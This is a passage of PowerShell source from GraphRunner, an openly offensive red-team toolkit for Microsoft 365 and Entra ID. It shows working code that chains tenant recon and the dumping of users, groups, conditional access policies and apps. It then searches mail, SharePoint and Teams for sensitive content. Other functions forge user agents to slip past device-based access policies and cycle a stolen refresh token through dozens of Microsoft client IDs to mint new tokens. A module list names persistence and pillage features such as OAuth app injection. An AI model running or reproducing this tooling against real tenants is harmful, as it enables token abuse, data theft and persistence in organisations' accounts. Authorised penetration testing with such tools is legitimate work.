        Author: Curtis Ringwald (@C0axx)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

        .DESCRIPTION
        This function allows you to create a new calendar event by sending a POST request to the Microsoft Graph API.

        .PARAMETER Tokens
        The access token required to authenticate with the Microsoft Graph API.

        .PARAMETER Subject
        The subject or title of the event.

        .PARAMETER Start
        The start date and time of the event.

        .PARAMETER End
        The end date and time of the event.

        .PARAMETER Body
        The description or body content of the event.

        .PARAMETER Location
        (Optional) The location of the event.

        .PARAMETER Attendees
        An array of email addresses of participants (attendees) to invite to the event.

        .EXAMPLE
        $Tokens = Get-YourAccessTokenFunction
        $Subject = "Meeting with HR"
        $Start = (Get-Date).AddHours(2)
        $End = $Start.AddHours(1)
        $Body = "Discuss potential Abuses :)"
        $TimeZone = "UTC"
        $Attendees = @("participant1@example.com", "participant2@example.com")
        Invoke-CreateCalendarEvent -Tokens $Tokens -Subject $Subject -Start $Start -End $End -Body $Body -Location $Location -TimeZone $TimeZone -Attendees $Attendees
        #>
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true)]
        [PSCustomObject]$Tokens,

        [Parameter(Mandatory=$true)]
        [string]$Subject,

        [Parameter(Mandatory=$true)]
        [DateTime]$Start,

        [Parameter(Mandatory=$true)]
        [DateTime]$End,

        [Parameter(Mandatory=$true)]
        [string]$Body,

        [Parameter()]
        [string]$Location = "",

        [Parameter()]
        [string]$TimeZone = "UTC",

        [Parameter()]
        [string[]]$Attendees = @()
    )

    try {
        # Set the Microsoft Graph API endpoint for creating events
        $uri = "https://graph.microsoft.com/v1.0/me/events"

        # Prepare headers for the request
        $headers = @{
            "Authorization" = "Bearer $($Tokens.access_token)"
            "Content-Type"  = "application/json"
        }

        # Create the event data in a structured format
        $eventData = @{
            subject = $Subject
            start   = @{
                dateTime = $Start.ToUniversalTime().ToString("o")
                timeZone = $TimeZone
            }
            end     = @{
                dateTime = $End.ToUniversalTime().ToString("o")
                timeZone = $TimeZone
            }
            body    = @{
                contentType = "text"
                content     = $Body
            }
            location = @{
                displayName = $Location
            }
            attendees = @(
                foreach ($attendee in $Attendees) {
                    @{
                        emailAddress = @{
                            address = $attendee
                        }
                        type = "required"
                    }
                }
            )
        }

        # Convert event data to JSON format with a higher depth limit
        $body = $eventData | ConvertTo-Json -Depth 10

        # Send an HTTP POST request to create the event
        $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Post -Body $body

        Write-Host "Event created successfully."
        return $response
    } catch {
        Write-Host "Failed to create the event: $($Error[0].Exception.Message)"
        return $null
    }
}


function Invoke-GraphRunner{
    <#
    .SYNOPSIS

        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.  
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER DetectorFile

        A json file containing KQL queries. See the default_detectors.json file in the repo as an example.

    .EXAMPLE
        
        C:\PS> Invoke-GraphRunner -Tokens $tokens
        -----------
        Runs through the account with many of the enumeration and pillage modules using the default_detectors.json file.
    #>

    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $false)]
    [string]
    $DetectorFile = ".\default_detectors.json",
    [switch]
    $DisableRecon,
    [switch]
    $DisableUsers,
    [switch]
    $DisableGroups,
    [switch]
    $DisableCAPS,
    [switch]
    $DisableApps,
    [switch]
    $DisableEmail,
    [switch]
    $DisableSharePoint,
    [switch]
    $DisableTeams
    )
    
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 
    
    $detectors = Get-Content $DetectorFile
    $detector = $detectors |ConvertFrom-Json

    $folderName = "GraphRunner-" + (Get-Date -Format 'yyyyMMddHHmmss')
    New-Item -Path $folderName -ItemType Directory | Out-Null

    # GraphRecon
    if(!$DisableRecon){
        Write-Host -ForegroundColor yellow "[*] Now running Invoke-GraphRecon."
        Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
    }

    # Users
    if(!$DisableUsers){
        Write-Host -ForegroundColor yellow "[*] Now getting all users"
        Get-AzureADUsers -Tokens $tokens -GraphRun -outfile "$folderName\users.txt"
    }

    # Groups
    if(!$DisableGroups){
        Write-Host -ForegroundColor yellow "[*] Now getting all groups"
        Get-SecurityGroups -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
    }

    # CAPS
    if(!$DisableCAPS){
        Write-Host -ForegroundColor yellow "[*] Now getting conditional access policies"
        Invoke-DumpCAPS -Tokens $tokens -ResolveGuids -GraphRun | Out-File -Encoding ascii "$folderName\caps.txt"
    }

    # Apps
    if(!$DisableApps){
        Write-Host -ForegroundColor yellow "[*] Now getting applications"
        Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
    }

    # Email
    if(!$DisableEmail){
        $mailout = "$folderName\interesting-mail.csv"

        Write-Host -ForegroundColor yellow "[*] Now searching Email using detector file $DetectorFile. Results will be written to $folderName."
        foreach($detect in $detector.Detectors){
            Invoke-SearchMailbox -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile $mailout -GraphRun -PageResults
        }
    }
    
    # SharePoint and OneDrive Tests
    if(!$DisableSharePoint){
        $spout = "$folderName\interesting-files.csv"

        Write-Host -ForegroundColor yellow "[*] Now searching SharePoint and OneDrive using detector file $DetectorFile. Results will be written to $folderName."
        foreach($detect in $detector.Detectors){
            Invoke-SearchSharePointAndOneDrive  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun
        }
    }
    
    # Teams
    if(!$DisableTeams){
        $teamsout = "$folderName\interesting-teamsmessages.csv"
        Write-Host -ForegroundColor yellow "[*] Now searching Teams using detector file $DetectorFile. Results will be written to $folderName."
        foreach($detect in $detector.Detectors){
            Invoke-SearchTeams  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -ResultSize 500 -OutFile $teamsout -GraphRun
        }
    }

    Write-Host -ForegroundColor yellow "[*] Results have been written to $folderName"
}
function Get-TenantID
{
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='Domain',Mandatory=$True)]
        [String]$domain
    )
    Process
    {
        $openIdConfig=Invoke-RestMethod "https://login.microsoftonline.com/$domain/.well-known/openid-configuration"
        $TenantId = $OpenIdConfig.authorization_endpoint.Split("/")[3]
        return $TenantId
    }
}
function Invoke-ForgeUserAgent
{
      <#
    .DESCRIPTION
        Forge the User-Agent when sending requests to the Microsoft API's. Useful for bypassing device specific Conditional Access Policies. Defaults to Windows Edge.
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
        [String]$Device,
        [Parameter(Mandatory=$False)]
        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
        [String]$Browser
    )
    Process
    {
        if ($Device -eq 'Mac')
        {
            if ($Browser -eq 'Chrome')
            {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            }
            elseif ($Browser -eq 'Firefox')
            {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0'
            }
            elseif ($Browser -eq 'Edge')
            {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0'
            }
            elseif ($Browser -eq 'Safari')
            {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            }
            else 
            {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            }
        }
        elseif ($Device -eq 'Windows')
        {
            if ($Browser -eq 'IE')
            {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
            }
            elseif ($Browser -eq 'Chrome')
            {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            }
            elseif ($Browser -eq 'Firefox')
            {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
            }
            elseif ($Browser -eq 'Edge')
            {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            }
            else 
            {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            }
        }
        elseif ($Device -eq 'AndroidMobile')
        {
            if ($Browser -eq 'Android')
            {
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            }
            elseif ($Browser -eq 'Chrome')
            {
                $UserAgent = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
            }
            elseif ($Browser -eq 'Firefox')
            {
                $UserAgent = 'Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0'
            }
            elseif ($Browser -eq 'Edge')
            {
                $UserAgent = 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057'
            }
            else 
            {
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            }
        }
        elseif ($Device -eq 'iPhone')
        {
            if ($Browser -eq 'Chrome')
            {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1'
            }
            elseif ($Browser -eq 'Firefox')
            {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4'
            }
            elseif ($Browser -eq 'Edge')
            {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1'
            }
            elseif ($Browser -eq 'Safari')
            {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
            }
            else 
            {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
            }
        }
        else 
        {
            #[ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
            if ($Browser -eq 'Android')
            {
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            }
            elseif($Browser -eq 'IE')
            { 
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
            }
            elseif($Browser -eq 'Chrome')
            { 
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            }
            elseif($Browser -eq 'Firefox')
            { 
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
            }
            elseif($Browser -eq 'Safari')
            {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15' 
            }
            else
            {
                $UserAgent = $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
            } 
        }
        return $UserAgent
   }   
}
function Invoke-BruteClientIDAccess {

    [cmdletbinding()]
    Param([Parameter(Mandatory=$true)]
    [string]$domain,
    [Parameter(Mandatory=$false)]
    [string]$Resource = "https://graph.microsoft.com/",
    [Parameter(Mandatory=$true)]
    [string]$refreshToken,
    [Parameter(Mandatory=$False)]
    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
    [String]$Device,
    [Parameter(Mandatory=$False)]
    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
    [String]$Browser,
    [Parameter(Mandatory=$False)]
    [ValidateSet('Yellow','Red','DarkGreen','DarkRed')]
    [String]$OutputColor = "White"
    )
    if ($Device) {
		if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
		}
		else {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device
		}
	}
	else {
	   if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
	   } 
	   else {
			$UserAgent = Invoke-ForgeUserAgent
	   }
	}
    $AppInfo = @(
        [pscustomobject]@{ClientID='00b41c95-dab0-4487-9791-b9d2c32c80f2'; App='Office 365 Management'}
        [pscustomobject]@{ClientID='04b07795-8ddb-461a-bbee-02f9e1bf7b46'; App='Microsoft Azure CLI'}
        [pscustomobject]@{ClientID='0ec893e0-5785-4de6-99da-4ed124e5296c'; App='Office UWP PWA'}
        [pscustomobject]@{ClientID='18fbca16-2224-45f6-85b0-f7bf2b39b3f3'; App='Microsoft Docs'}
        [pscustomobject]@{ClientID='1950a258-227b-4e31-a9cf-717495945fc2'; App='Microsoft Azure PowerShell'}
        [pscustomobject]@{ClientID='1b3c667f-cde3-4090-b60b-3d2abd0117f0'; App='Windows Spotlight'}
        [pscustomobject]@{ClientID='1b730954-1685-4b74-9bfd-dac224a7b894'; App='Azure Active Directory PowerShell'}
        [pscustomobject]@{ClientID='1fec8e78-bce4-4aaf-ab1b-5451cc387264'; App='Microsoft Teams'}
        [pscustomobject]@{ClientID='22098786-6e16-43cc-a27d-191a01a1e3b5'; App='Microsoft To-Do client'}
        [pscustomobject]@{ClientID='268761a2-03f3-40df-8a8b-c3db24145b6b'; App='Universal Store Native Client'}
        [pscustomobject]@{ClientID='26a7ee05-5602-4d76-a7ba-eae8b7b67941'; App='Windows Search'}
        [pscustomobject]@{ClientID='27922004-5251-4030-b22d-91ecd9a37ea4'; App='Outlook Mobile'}
        [pscustomobject]@{ClientID='29d9ed98-a469-4536-ade2-f981bc1d605e'; App='Microsoft Authentication Broker'}
        [pscustomobject]@{ClientID='2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8'; App='Microsoft Bing Search for Microsoft Edge'}
        [pscustomobject]@{ClientID='4813382a-8fa7-425e-ab75-3b753aab3abb'; App='Microsoft Authenticator App '}
        [pscustomobject]@{ClientID='4e291c71-d680-4d0e-9640-0a3358e31177'; App='PowerApps'}
        [pscustomobject]@{ClientID='57336123-6e14-4acc-8dcf-287b6088aa28'; App='Microsoft Whiteboard Client'}
        [pscustomobject]@{ClientID='57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0'; App='Microsoft Flow Mobile PROD-GCCH-CN'}
        [pscustomobject]@{ClientID='60c8bde5-3167-4f92-8fdb-059f6176dc0f'; App='Enterprise Roaming and Backup'}
        [pscustomobject]@{ClientID='66375f6b-983f-4c2c-9701-d680650f588f'; App='Microsoft Planner'}
        [pscustomobject]@{ClientID='844cca35-0656-46ce-b636-13f48b0eecbd'; App='Microsoft Stream Mobile Native'}
        [pscustomobject]@{ClientID='872cd9fa-d31f-45e0-9eab-6e460a02d1f1'; App='Visual Studio - Legacy'}
        [pscustomobject]@{ClientID='87749df4-7ccf-48f8-aa87-704bad0e0e16'; App='Microsoft Teams - Device Admin Agent'}
        [pscustomobject]@{ClientID='90f610bf-206d-4950-b61d-37fa6fd1b224'; App='Aadrm Admin PowerShell'}
        [pscustomobject]@{ClientID='9ba1a5c7-f17a-4de9-a1f1-6178c8d51223'; App='Microsfot Intune Company Portal'}
        [pscustomobject]@{ClientID='9bc3ab49-b65d-410a-85ad-de819febfddc'; App='Microsoft SharePoint Online Management Shell'}
        [pscustomobject]@{ClientID='a0c73c16-a7e3-4564-9a95-2bdf47383716'; App='Microsoft Exchange Online Remote PowerShell'}
        [pscustomobject]@{ClientID='a40d7d7d-59aa-447e-a655-679a4107e548'; App='Accounts Control UI'}
        [pscustomobject]@{ClientID='a569458c-7f2b-45cb-bab9-b7dee514d112'; App='Yammer iPhone'}
        [pscustomobject]@{ClientID='ab9b8c07-8f02-4f72-87fa-80105867a763'; App='OneDrive Sync Engine '}
        [pscustomobject]@{ClientID='af124e86-4e96-495a-b70a-90f90ab96707'; App='OneDrive iOS App'}
        [pscustomobject]@{ClientID='b26aadf8-566f-4478-926f-589f601d9c74'; App='OneDrive'}
        [pscustomobject]@{ClientID='b90d5b8f-5503-4153-b545-b31cecfaece2'; App='AADJ CSP '}
        [pscustomobject]@{ClientID='c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12'; App='Microsoft Power BI'}
        [pscustomobject]@{ClientID='c58637bb-e2e1-4312-8a00-04b5ffcd3403'; App='SharePoint Online Client Extensibility'}
        [pscustomobject]@{ClientID='cb1056e2-e479-49de-ae31-7812af012ed8'; App='Microsoft Azure Active Directory Connect'}
        [pscustomobject]@{ClientID='cf36b471-5b44-428c-9ce7-313bf84528de'; App='Microsoft Bing Search'}
        [pscustomobject]@{ClientID='d326c1ce-6cc6-4de2-bebc-4591e5e13ef0'; App='SharePoint'}
        [pscustomobject]@{ClientID='d3590ed6-52b3-4102-aeff-aad2292ab01c'; App='Microsoft Office'}
        [pscustomobject]@{ClientID='e9b154d0-7658-433b-bb25-6b8e0a8a7c59'; App='Outlook Lite'}
        [pscustomobject]@{ClientID='e9c51622-460d-4d3d-952d-966a5b1da34c'; App='Microsoft Edge'}
        [pscustomobject]@{ClientID='eb539595-3fe1-474e-9c1d-feb3625d1be5'; App='Microsoft Tunnel'}
        [pscustomobject]@{ClientID='ecd6b820-32c2-49b6-98a6-444530e5a77a'; App='Microsoft Edge'}
        [pscustomobject]@{ClientID='f05ff7c9-f75a-4acd-a3b5-f4b6a870245d'; App='SharePoint Android'}
        [pscustomobject]@{ClientID='f448d7e5-e313-4f90-a3eb-5dbb3277e4b3'; App='Media Recording for Dynamics 365 Sales'}
        [pscustomobject]@{ClientID='f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34'; App='Microsoft Edge'}
        [pscustomobject]@{ClientID='fb78d390-0c51-40cd-8e17-fdbfab77341b'; App='Microsoft Exchange REST API Based PowerShell'}
        [pscustomobject]@{ClientID='fc0f3af4-6835-4174-b806-f7db311fd2f3'; App='Microsoft Intune Windows Agent'}
        )
        $AppInfo | % {
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $TenantId = Get-TenantID -domain $domain
        $authUrl = "https://login.microsoftonline.com/$($TenantId)"
        $body = @{
            "resource" =      $Resource
            "client_id" =     $_.ClientID
            "grant_type" =    "refresh_token"
            "refresh_token" = $refreshToken
            "scope" = "openid"
        }
        $ErrorActionPreference = "SilentlyContinue"
        $global:CustomToken = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $body
        Write-Host -ForegroundColor $OutputColor "App: $($_.App) ClientID: $($_.ClientID) has scope of: $($CustomToken.scope)"
    }
}
function Invoke-ImportTokens {
    [cmdletbinding()]
    Param([Parameter(Mandatory=$false)]
    [String]$AccessToken,
    [Parameter(Mandatory=$false)]
    [String]$RefreshToken
    )
    $global:tokens = $null
    $global:tokens = @(
        [pscustomobject]@{access_token=$AccessToken;refresh_token=$RefreshToken}
    )
}
function List-GraphRunnerModules{
    <#
    .SYNOPSIS 
    A module to list all of the GraphRunner modules
    #>

    Write-Host -foregroundcolor green "[*] Listing GraphRunner modules..."

    Write-Host -ForegroundColor green "-------------------- Authentication Modules -------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Get-GraphTokens`t`t`t-`t Authenticate as a user to Microsoft Graph
Invoke-RefreshGraphTokens`t-`t Use a refresh token to obtain new access tokens
Get-AzureAppTokens`t`t-`t Complete OAuth flow as an app to obtain access tokens
Invoke-RefreshAzureAppTokens`t-`t Use a refresh token and app credentials to refresh a token
Invoke-AutoTokenRefresh`t-`t Refresh tokens at an interval.
    "
    Write-Host -ForegroundColor green "----------------- Recon & Enumeration Modules -----------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-GraphRecon`t`t-`t Performs general recon for org info, user settings, directory sync settings, etc
Invoke-DumpCAPS`t`t`t-`t Gets conditional access policies
Invoke-DumpApps`t`t`t-`t Gets app registrations and external enterprise apps along with consent and scope info
Get-AzureADUsers`t`t-`t Gets user directory
Get-SecurityGroups`t`t-`t Gets security groups and members
Get-UpdatableGroups`t`t-`t Gets groups that may be able to be modified by the current user
Get-DynamicGroups`t`t-`t Finds dynamic groups and displays membership rules
Get-SharePointSiteURLs`t`t-`t Gets a list of SharePoint site URLs visible to the current user
Invoke-GraphOpenInboxFinder`t-`t Checks each user’s inbox in a list to see if they are readable
Get-TenantID`t`t`t-`t Retreives the tenant GUID from the domain name
    "
    Write-Host -ForegroundColor green "--------------------- Persistence Modules ---------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-InjectOAuthApp`t`t-`t Injects an app registration into the tenant
Invoke-SecurityGroupCloner`t-`t Clones a security group while using an identical name and member list but can inject another user as well
Invoke-InviteGuest`t`t-`t Invites a guest user to the tenant
Invoke-AddGroupMember`t`t-`t Adds a member to a group
    "
    Write-Host -ForegroundColor green "----------------------- Pillage Modules -----------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-SearchSharePointAndOneDrive -`t Search across all SharePoint sites and OneDrive drives visible to the user
Invoke-ImmersiveFileReader`t-`t Open restricted files with the immersive reader
Invoke-SearchMailbox`t`t-`t Has the ability to do deep searches across a user’s mailbox and can export messages
Invoke-SearchTeams`t`t-`t Can search all Teams messages in all channels that are readable by the current user.
Invoke-SearchUserAttributes`t-`t Search for terms across all user attributes in a directory
Get-Inbox`t`t`t-`t Gets inbox items
Get-TeamsChat`t`t`t-`t Downloads full Teams chat conversations
    "
    Write-Host -ForegroundColor green "-------------------- Teams Modules -------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Get-TeamsApps`t`t`t-`t This module enumerates all accessible Teams chat channel and grabs the URL for all installed apps in side each channel.
Get-TeamsChannels`t`t-`t This module enumerates all accessible teams and the channels a user has access to. 
Find-ChannelEmails`t`t-`t This module enumerates all accessible teams and the channels looking for any email addresses assoicated with them. 
Get-ChannelUsersEnum`t`t-`t This module enumerates a defined channel to see how many people are in a channel and who they are.
Get-ChannelEmail`t`t-`t This module enumerates a defined channel for an email address and sets the sender type to Anyone. If there is no email address create one and sets the sender type to Anyone.
Get-Webhooks`t`t`t-`t This module enumerates all accessible channels looking for any webhooks and their configuration information, including its the url.
Create-Webhook`t`t`t-`t This module creates a webhook in a defined channel and provides the URL.
Send-TeamsMessage`t`t-`t This module sends a message using Microsoft Team's webhooks, without needing any authentication
    "
    Write-Host -ForegroundColor green "--------------------- GraphRunner Module ----------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-GraphRunner`t`t-`t Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams."

    Write-Host -ForegroundColor green "-------------------- Supplemental Modules ---------------------"
    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
    Write-Host -ForegroundColor green "Invoke-DeleteOAuthApp`t`t-`t Delete an OAuth App
Invoke-DeleteGroup`t`t-`t Delete a group
Invoke-RemoveGroupMember`t-`t Module for removing users/members from groups
Invoke-DriveFileDownload`t-`t Has the ability to download single files from as the current user.
Invoke-CheckAccess`t`t-`t Check if tokens are valid
Invoke-AutoOAuthFlow`t`t-`t Automates OAuth flow by standing up a web server and listening for auth code
Invoke-HTTPServer`t`t-`t A basic web server to use for accessing the emailviewer that is output from Invoke-SearchMailbox
Invoke-BruteClientIDAccess`t-`t Test different CLientID's against MSGraph to determine permissions
Invoke-ImportTokens`t`t-`t Import tokens from other tools for use in GraphRunner
Get-UserObjectID`t`t-`t Retrieves an object ID for a user
    "
    Write-Host -ForegroundColor green ("=" * 80)
    Write-Host -ForegroundColor green '[*] For help with individual modules run Get-Help <module name> -detailed'
    Write-Host -ForegroundColor green '[*] Example: Get-Help Invoke-InjectOAuthApp -detailed'
}
